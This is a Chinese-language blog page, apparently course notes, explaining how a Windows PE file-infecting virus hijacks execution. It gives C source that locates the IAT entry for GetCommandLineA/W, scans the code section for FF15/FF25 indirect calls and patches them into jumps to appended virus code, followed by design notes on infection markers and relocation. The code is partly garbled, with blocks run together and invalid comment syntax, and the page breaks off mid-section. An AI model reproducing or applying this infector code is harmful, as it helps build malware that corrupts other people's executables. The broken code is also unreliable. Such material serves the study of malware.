@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wsw8.online","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="程序实现指令Patch如何找到需要Patch的指令 首先指定一个会被大概率调用的函数名（也包括函数所在DLL的名字） 然后通过被寄生文件（exe）的导入表找到该函数的导入表项的地址（即IAT中对应项的地址） 最后去exe文件的代码中搜索所有可能的Call [xxxx]或JMP [xxxx]，进行Patch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="病毒_Win_指令Patch实现和重定位表">
+<meta property="og:url" content="https://wsw8.online/2021/05/20/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/index.html">
+<meta property="og:site_name" content="江湖">
+<meta property="og:description" content="程序实现指令Patch如何找到需要Patch的指令 首先指定一个会被大概率调用的函数名（也包括函数所在DLL的名字） 然后通过被寄生文件（exe）的导入表找到该函数的导入表项的地址（即IAT中对应项的地址） 最后去exe文件的代码中搜索所有可能的Call [xxxx]或JMP [xxxx]，进行Patch">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/image-20210520210019073.png">
+<meta property="article:published_time" content="2021-05-20T11:21:02.000Z">
+<meta property="article:modified_time" content="2021-05-20T13:55:27.576Z">
+<meta property="article:author" content="汪道之">
+<meta property="article:tag" content="课程">
+<meta property="article:tag" content="计算机">
+<meta property="article:tag" content="病毒">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wsw8.online/images/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/image-20210520210019073.png">
+
+<link rel="canonical" href="https://wsw8.online/2021/05/20/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>病毒_Win_指令Patch实现和重定位表 | 江湖</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">江湖</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">有人的地方就有江湖</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wsw8.online/2021/05/20/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="汪道之">
+      <meta itemprop="description" content="有的人身着布衣，却心有锦缎。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="江湖">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          病毒_Win_指令Patch实现和重定位表
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-20 19:21:02 / 修改时间：21:55:27" itemprop="dateCreated datePublished" datetime="2021-05-20T19:21:02+08:00">2021-05-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%97%85%E6%AF%92/" itemprop="url" rel="index"><span itemprop="name">病毒</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="程序实现指令Patch"><a href="#程序实现指令Patch" class="headerlink" title="程序实现指令Patch"></a>程序实现指令Patch</h2><h3 id="如何找到需要Patch的指令"><a href="#如何找到需要Patch的指令" class="headerlink" title="如何找到需要Patch的指令"></a>如何找到需要Patch的指令</h3><ol>
+<li>首先指定一个会被大概率调用的函数名（也包括函数所在DLL的名字）</li>
+<li>然后通过被寄生文件（exe）的导入表找到该函数的导入表项的地址（即IAT中对应项的地址）</li>
+<li>最后去exe文件的代码中搜索所有可能的Call [xxxx]或JMP [xxxx]，进行Patch</li>
+</ol>
+<span id="more"></span>
+
+<h3 id="将RVA转换为文件位置"><a href="#将RVA转换为文件位置" class="headerlink" title="将RVA转换为文件位置"></a>将RVA转换为文件位置</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getFileOffsetByRva</span><span class="params">(FILE * fp, <span class="type">int</span> sectionNum, <span class="type">int</span> rva)</span></span><br><span class="line">&#123;</span><br><span class="line">   IMAGE_SECTION_HEADER curHdr;   <span class="comment">//定义变量，用来存节头信息</span></span><br><span class="line">   locateNTHdrStart(fp);   <span class="comment">//定位到NT头</span></span><br><span class="line">   fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);<span class="comment">//定位到节表</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">      <span class="comment">//判断参数rva在哪个节</span></span><br><span class="line">      <span class="keyword">if</span> ((rva &gt;= curHdr.VirtualAddress) &amp;&amp; </span><br><span class="line">          (rva &lt;= curHdr.VirtualAddress + curHdr.Misc.VirtualSize))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">//返回rva所对应的文件位置   </span></span><br><span class="line">          <span class="keyword">return</span> curHdr.PointerToRawData + (rva - curHdr.VirtualAddress);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//rva不存在任一节中，返回-1</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Patch指令的函数"><a href="#Patch指令的函数" class="headerlink" title="Patch指令的函数"></a>Patch指令的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">patchApiCall</span><span class="params">(</span></span><br><span class="line"><span class="params">      FILE * fp, </span></span><br><span class="line"><span class="params">      <span class="type">char</span> * funcName,         <span class="comment">//API函数的名字（要被Patch的调用指令）</span></span></span><br><span class="line"><span class="params">      <span class="type">char</span> * dllName,          <span class="comment">//API函数所属DLL的名字</span></span></span><br><span class="line"><span class="params">      IMAGE_NT_HEADERS* hdrs,  <span class="comment">//NT头的信息</span></span></span><br><span class="line"><span class="params">      <span class="type">int</span> jmpDesAddress        <span class="comment">//跳转的地址，病毒首地址</span></span></span><br><span class="line"><span class="params">      )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//在文件中找到导入表的位置</span></span><br><span class="line">  <span class="type">bool</span> result = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//找到导入表的RVA</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> importTbRva = hdrs-&gt;</span><br><span class="line">OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"><span class="keyword">if</span> (importTbRva == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;has not import tb, so exit\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将RVA转换为导入表的文件位置</span></span><br><span class="line"><span class="type">int</span> importTbOffset = </span><br><span class="line">  getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, importTbRva);</span><br><span class="line"><span class="keyword">if</span> (importTbOffset == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;cannot locate import tb\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//找到指定API函数在IAT表中的表项地址</span></span><br><span class="line">    _IMAGE_IMPORT_DESCRIPTOR importDes;  <span class="comment">//指向结构体（导入表目录项）定义变量</span></span><br><span class="line"><span class="type">int</span> targetIATAddress = <span class="number">0</span>;  <span class="comment">//变量，指定API函数在IAT表中的表项地址（RVA），初始化为0</span></span><br><span class="line"><span class="type">int</span> desIndex = <span class="number">0</span>; <span class="comment">//遍历的索引</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) <span class="comment">//找到就退出循环</span></span><br><span class="line">&#123; <span class="comment">//每次定位到结构体开始的位置 </span></span><br><span class="line">  fseek(fp, importTbOffset + desIndex * <span class="keyword">sizeof</span>(_IMAGE_IMPORT_DESCRIPTOR), SEEK_SET);</span><br><span class="line">  <span class="comment">//读结构体到变量</span></span><br><span class="line">  fread(&amp;importDes, <span class="keyword">sizeof</span>(_IMAGE_IMPORT_DESCRIPTOR), <span class="number">1</span>, fp);</span><br><span class="line">  desIndex++; <span class="comment">//循环索引加1</span></span><br><span class="line">  <span class="keyword">if</span> (importDes.FirstThunk == <span class="number">0</span>)  <span class="comment">//如果IAT表为0，跳出循环</span></span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">  <span class="comment">//将结构体中DLL名字的RVA转换成文件位置</span></span><br><span class="line">  <span class="type">int</span> offset = getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, importDes.Name);</span><br><span class="line">  <span class="comment">//将DLL的文件名读出，放到name数组里面</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">128</span>];</span><br><span class="line">  fseek(fp, offset, SEEK_SET);</span><br><span class="line">  <span class="type">char</span> * p = name;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    fread(p, <span class="number">1</span>, <span class="number">1</span>, fp);  <span class="comment">//每次读一个字节</span></span><br><span class="line">    <span class="keyword">if</span> (* p == <span class="number">0</span>)  <span class="comment">//字符串结束标识符</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    p++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//以上代码取出导入表目录项中的DLL名字，用来和函数传递的参数dllName（即API函数的DLL）进行比较</span></span><br><span class="line"><span class="keyword">if</span> (stricmp(name, dllName) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//比较dll的名字，判断是否是API函数所在DLL的导出表目录项</span></span><br><span class="line"><span class="comment">//根据预先绑定，如果有INT就用INT表来找函数名，没有就用IAT表找函数名</span></span><br><span class="line"><span class="type">long</span> actualFirstThunk = importDes.OriginalFirstThunk == <span class="number">0</span> ? </span><br><span class="line">          importDes.FirstThunk : importDes.OriginalFirstThunk;</span><br><span class="line"><span class="comment">//获得INT表（或IAT表）的RVA，并将其转换为文件位置</span></span><br><span class="line"><span class="type">int</span> nameListStart = getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, actualFirstThunk);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; ; i++) <span class="comment">//遍历INT表（或IAT表）的每一项，查找指定的API函数名</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> thunkRva;   <span class="comment">//每项的RVA字段，注意Peview工具解析了很多信息，但表里每项只有RVA</span></span><br><span class="line">  fseek(fp, nameListStart + i * <span class="keyword">sizeof</span>(thunkRva), SEEK_SET); <span class="comment">//定位到i项的文件位置    </span></span><br><span class="line">  fread(&amp;thunkRva, <span class="keyword">sizeof</span>(thunkRva), <span class="number">1</span>, fp); <span class="comment">//读每项信息到变量</span></span><br><span class="line">  <span class="keyword">if</span> (thunkRva == <span class="number">0</span>)  <span class="comment">//表的结束符为0</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;find dll %s but not find who call %s\n&quot;</span>, dllName, funcName);</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> thunkOffset =   \\将读出的RVA（如<span class="number">2</span>A270）转换为文件位置（转为<span class="number">28270</span>） </span><br><span class="line">   getFileOffsetByRva(fp, hdrs-&gt;FileHeader.NumberOfSections, thunkRva);</span><br><span class="line">  fseek(fp, thunkOffset + <span class="number">2</span>, SEEK_SET);\\定位到函数名，跳过<span class="number">2</span>字节序号</span><br><span class="line">  fread(name, <span class="keyword">sizeof</span>(name), <span class="number">1</span>, fp); \\读函数名到name</span><br><span class="line"> <span class="title function_">if</span> <span class="params">(stricmp(name, funcName) == <span class="number">0</span>)</span></span><br><span class="line">  &#123; <span class="comment">//和传递的参数funcName作比较</span></span><br><span class="line">    <span class="comment">//找到，计算IAT表相应表项的位置</span></span><br><span class="line">    targetIATAddress =</span><br><span class="line">     hdrs-&gt;OptionalHeader.ImageBase + importDes.FirstThunk + <span class="number">4</span> * i;</span><br><span class="line">   <span class="keyword">break</span>;<span class="comment">//break前面的for循环</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">//break前面的while循环</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//找到符合的指令进行Patch</span></span><br><span class="line">    IMAGE_SECTION_HEADER curHdr;</span><br><span class="line">locateNTHdrStart(fp);  <span class="comment">//定位到NT头的文件位置</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);<span class="comment">//定位到节表</span></span><br><span class="line"><span class="comment">//遍历节表找代码节，指令在代码节</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; hdrs-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="comment">//读出节头</span></span><br><span class="line">  fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">  <span class="keyword">if</span> ((curHdr.Characteristics &amp; <span class="number">0x20</span>) == <span class="number">0x20</span>) <span class="comment">//查找代码属性0x20</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="type">char</span> *code = (<span class="type">char</span> *)<span class="built_in">malloc</span>(curHdr.Misc.VirtualSize); </span><br><span class="line">     fread(code, <span class="number">1</span>, curHdr.Misc.VirtualSize, fp); <span class="comment">//读出节的内容到code数组</span></span><br><span class="line"><span class="type">char</span> * p = code;  <span class="comment">//p指向代码节当前搜索位置，初始化为code开始的地方</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; curHdr.Misc.VirtualSize;)  <span class="comment">//循环遍历每个字节</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">unsigned</span> <span class="type">short</span> opCode = *(<span class="type">unsigned</span> <span class="type">short</span> *)p; <span class="comment">//每次读2个字节，进行操作码FF15和FF25判断</span></span><br><span class="line">   <span class="keyword">if</span> (( opCode == <span class="number">0x15ff</span>) || (opCode == <span class="number">0x25ff</span>)) <span class="comment">//找到FF15或FF25</span></span><br><span class="line">   &#123;  <span class="comment">//p+2为FF15或FF25后面，int读4个字节，是可能的IAT表项的RVA地址</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> possibleIATAddress = *(<span class="type">unsigned</span> <span class="type">int</span> *) (p + <span class="number">2</span>); </span><br><span class="line">      <span class="keyword">if</span> (targetIATAddress == possibleIATAddress) <span class="comment">//和读出的IAT表的RVA一致</span></span><br><span class="line">      &#123;  result = <span class="literal">true</span>; <span class="comment">//进行指令Patch</span></span><br><span class="line">         <span class="type">char</span> instr[<span class="number">6</span>];</span><br><span class="line">         <span class="keyword">if</span> (opCode == <span class="number">0x15ff</span>) <span class="comment">//FF15对应间接call[xx]，只能替换成call指令</span></span><br><span class="line">         &#123;  instr[<span class="number">0</span>] = <span class="number">0xe8</span>;<span class="comment">//替换call的机器码e8</span></span><br><span class="line">            instr[<span class="number">5</span>] = <span class="number">0x90</span>;<span class="comment">//最后一个字节需要填充NOP</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> <span class="comment">//是jmp[xx]，替换为jmp指令</span></span><br><span class="line">            instr[<span class="number">0</span>] = <span class="number">0xe9</span>;<span class="comment">//替换成jmp指令机器码e9</span></span><br><span class="line">         <span class="comment">//计算跳转偏移量，先计算跳转的源地址:节起始RVA + imageBase + Patch指令后面的节内偏移 </span></span><br><span class="line">         <span class="type">long</span> srcAddress = curHdr.VirtualAddress + </span><br><span class="line">                              hdrs-&gt;OptionalHeader.ImageBase + </span><br><span class="line">                                                        (p + <span class="number">5</span> - code);</span><br><span class="line">         *(<span class="type">long</span> *)&amp;instr[<span class="number">1</span>] = jmpDesAddress - srcAddress; <span class="comment">//填写跳转偏移,跳转目的地址-源地址</span></span><br><span class="line">         fseek(fp, curHdr.PointerToRawData + (p - code), SEEK_SET); <span class="comment">//定位到patch指令</span></span><br><span class="line">         fwrite(instr, <span class="number">1</span>, <span class="number">6</span>, fp); <span class="comment">//写入patch指令</span></span><br><span class="line">         i2 += <span class="number">6</span>;</span><br><span class="line">         p += <span class="number">6</span>;</span><br><span class="line">         <span class="keyword">continue</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   i2 +=<span class="number">2</span>; p += <span class="number">2</span>; </span><br><span class="line"><span class="comment">//获得病毒代码开始位置的内存地址，是patch指令函数patchApiCall的参数</span></span><br><span class="line"><span class="type">long</span> jmpDesAddress = lastSectionHdr.VirtualAddress + </span><br><span class="line">     lastSectionHdr.Misc.VirtualSize + ntHdrs.OptionalHeader.ImageBase;</span><br><span class="line"><span class="comment">//0代表没找到给定函数的调用指令</span></span><br><span class="line"><span class="comment">//1代表找到了GetCommandLineA的调用指令进行了Patch</span></span><br><span class="line"><span class="comment">//2代表找到了GetCommandLineW的调用指令进行了Patch</span></span><br><span class="line"><span class="type">int</span> thefunc = <span class="number">0</span>; <span class="comment">//初始化为0</span></span><br><span class="line"><span class="comment">//调用patchApiCall函数，返回值代表是否Patch成功</span></span><br><span class="line"><span class="keyword">if</span> (patchApiCall(fp, <span class="string">&quot;GetCommandLineA&quot;</span>, <span class="string">&quot;kernel32.dll&quot;</span>, &amp;ntHdrs, jmpDesAddress))</span><br><span class="line">  thefunc = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (patchApiCall(fp, <span class="string">&quot;GetCommandLineW&quot;</span>, <span class="string">&quot;kernel32.dll&quot;</span>, &amp;ntHdrs, jmpDesAddress))</span><br><span class="line">  thefunc = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (thefunc == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span>; <span class="comment">//没有patch成功，直接返回，不寄生</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//布尔型变量isGetCommandLineW，用于告诉后面的病毒寄生代码Patch的到底是哪个函数</span></span><br><span class="line"><span class="type">bool</span> iscommandLineW = (thefunc == <span class="number">1</span> ? <span class="literal">false</span> : <span class="literal">true</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="针对导入表项调用指令Patch的病毒设计"><a href="#针对导入表项调用指令Patch的病毒设计" class="headerlink" title="针对导入表项调用指令Patch的病毒设计"></a>针对导入表项调用指令Patch的病毒设计</h2><ol>
+<li>我们准备patch调用GetCommandLineA或GetCommandLineW的函数，因为它们基本在入口处会被调用，这样可以保证病毒一开始就执行</li>
+<li>为了防止函数再次调用时病毒再次执行，我们增加了一个标记</li>
+<li>另外，感染时到底patch的是W还是A版的GetCommandLine，也有一个标记来告诉寄生的病毒代码，从而寄生病毒执行时才知道去找哪个函数的实际入口地址</li>
+<li>寄生病毒执行时，找到函数地址后需要存储一下，因此，并分配了4字节存储GetCommandLineX（W&#x2F;A）的入口地址。为了不修改老代码，数据区开始的原来13个字节没有删减，用于存放这3个信息。</li>
+<li>在数据段增加了“GetCommandLineA”和” GetCommandLineW”串，因为要用getproc动态查找到其首址跳过去</li>
+<li>增加了获取kernel32基址和获取GetCommandLineW&#x2F;A的代码</li>
+<li>最后用JMP指令跳到GetCommandLineW&#x2F;A去</li>
+</ol>
+<h3 id="最后跳转指令"><a href="#最后跳转指令" class="headerlink" title="最后跳转指令"></a>最后跳转指令</h3><ol>
+<li>在patch指令的时候，我们将原来的call [xxxx] ，Jmp [xxxx] 变成一条“Jmp 偏移”形式的指令跳到病毒，在病毒代码执行后，我们需要在尾部添加一条跳回原来函数[xxxx]的指令</li>
+<li>因此，我们依然添加一条 Jmp [xxxx] 的间接跳转指令。这样我们就不必自己查找原函数的入口了，节省了代码</li>
+<li>但该方法因为 Jmp [xxxx] 包含的地址xxxx是绝对地址（这是函数所对应的IAT表项的地址），如果在exe可重定位的情况下，这个xxxx地址是需要重定位的</li>
+<li>然而，病毒尾部的这条Jmp [xxxx]是病毒添加的，因此，在重定位表中没有重定位项的，所以会出错</li>
+<li>解决的方法：添加重定位项或让exe不会重定位</li>
+</ol>
+<h3 id="病毒数据区"><a href="#病毒数据区" class="headerlink" title="病毒数据区"></a>病毒数据区</h3><p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%AE%9E%E7%8E%B0%E5%92%8C%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8/image-20210520210019073.png" alt="image-20210520210019073"></p>
+<p>初始化数据区代码：</p>
